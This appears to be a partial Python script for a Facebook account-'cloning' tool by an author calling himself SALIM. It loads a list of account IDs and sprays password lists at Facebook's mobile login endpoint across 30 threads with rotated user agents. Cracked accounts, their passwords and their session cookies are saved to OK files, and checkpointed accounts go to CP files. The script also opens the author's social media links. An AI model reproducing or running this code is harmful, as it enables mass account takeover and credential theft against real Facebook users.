...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mEVERYONE ENJOY Update...? ')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mADD MY FACEBOOK PROFILE")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100007344136004&mibextid=ZbWKwL')
#------------------[ SALIM-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
os.system("xdg-open https://www.facebook.com/profile.php?id=100007344136004&mibextid=ZbWKwL")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
\033[97;1m
░██████╗░█████╗░██╗░░░░░██╗███╗░░░███╗
...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;33m 
\x1b[1;96m🎭Owner,         • \x1b[1;96mMD-SALIM ]\x1b[1;96m     \x1b[1;96m 
🎭Facebook       • SAD SALIM ]     \x1b[1;96m  
🎭Github         • \33[1;38mSALIM-404 ]   \x1b[1;96m   
🎭VERSION        • 0.3 ]          \x1b[1;96m 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         \033[97;1m ASSALAMUALAIKUM 💚💚
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\33[1;38m"""
os.system('clear')
print(logo)
...
while attemps < 12345677901:
    ...
    if username == 'S' and password == '2':
        print(' \x1b[1;96mYou Have Successfully Logged in.')
        break
    else:
...
uname =input('\033[1;97m[\033[97;1m•\033[1;97m]\x1b[1;96m WHAT IS YOUR NAME \x1b[1;96m: \x1b[1;96m')
os.system('espeak -a 300 " Welcome,   to,  SALIM,  Vip,  Tools"')
pass
...
def menu():
    os.system('clear')
    print(logo)
    print(f"🎭\x1b[1;96mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("🎭\x1b[1;96mTODAY'S DATE :\x1b[1;96m "+date)
    print('\033[0;97m===============================================')
    print(f"""\033[97;1m[\033[97;1m1\033[97;1m] \x1b[1;96mFILE CLONING         """)
    print("""\033[97;1m[\033[97;1m0\033[97;1m] \x1b[1;96mEXIT""")
    print('\033[0;97m=================')
    SALIM = input('\x1b[1;96m[+] CHOOSE: ')
    if SALIM in ['111']:
        login()
        dump_massal()
    elif SALIM in ['1']:
        ...
        os.system('xdg-open https://wa.me/+8801782523106')
        os.system("python nono.py")
    elif SALIM in ['3','03']:
        result()
    elif SALIM in ['0']:
...
def dump_massal():
    ...
    try:
        print('\033[0;91m==================')
        print(f' \x1b[1;96m[\033[92;1m•\033[97;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
...
def crack_file():
    ...
    print('\x1b[1;96m[ Put File Example:  /sdcard/file.txt  Etc...]')
    o = input('\033[97;1m[\033[97;1m+\x1b[1;96m] INPut FILE NAME :\x1b[1;96m ')
...
def setting():
    print('\033[0;91m=============================')
    print("\033[97;1m[\033[97;1m1\033[97;1m] \x1b[1;96mCLONING FOR MIX IDz")
    print('\033[0;91m=============================')
    hu = input('\033[97;1m[\033[97;1m+\x1b[1;96m]CHOOSE :\x1b[1;96m ')
    if hu in ['1','01']:
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[97;1m1\x1b[1;96m] METHOD 1 [\x1b[1;96mCookies Show \033[0;91mCP ID Not Show\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\x1b[1;96m•\033[97;1m] CHOOSE : ')
    #os.system("xdg-open https://www.facebook.com/Tutul.King.Ok.Bro")
    if hc in ['1','01']:
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\x1b[1;96m✳️USER NAME        ."+uname)
    print("\x1b[1;96m✳️TODAY'S DATE     ."+date)
    print('\x1b[1;96m✳️YOUR TOTAL IDz   .',str(len(id)))
    print("\x1b[1;96m✳️CLONING TIME     ."+time.strftime("%H:%M")+" "+ tag)
    print('\033[0;97m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            ...
            if 'mobile' in method:
                ...
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\x1b[1;96m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\x1b[1;96m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\x1b[1;96m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \x1b[1;96m ENTER TO BACK')
    os.system("python nono.py")
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\x1b[1;96m{bo}[SALIM•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\x1b[1;96m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[SALIM-Cp] {idf} • {pw}')
                ...
                print(f'\033[97;1m[SALIM-Ok💚] {idf} • {pw}\x1b[1;96m   [🌺]= COOKIES • \x1b[1;96m{kuki} ')
                os.system('espeak -a 300 " SALIM,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SALIM-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\x1b[38;5;126m[{time.strftime("%H:%M")}•SALIM-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\x1b[38;5;126m[{time.strftime("%H:%M")}•SALIM-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  SALIM,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
